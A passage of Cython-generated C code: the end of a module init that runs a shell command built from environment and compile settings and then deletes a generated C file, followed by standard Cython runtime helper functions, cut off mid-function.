  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4452, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4452, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4453, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_2 = PyNumber_Add(__pyx_t_5, __pyx_kp_u__3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4453, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4455, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4454, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_kp_u__3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4455, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_COMPILE_FILE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4457, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_5, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4456, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_kp_u__3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4457, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_RUN); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4459, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4458, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4452, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4461, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_remove); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4461, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4461, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4461, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_3) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* SliceObject */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#endif
    {
        PyObject* result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object is unsliceable", Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
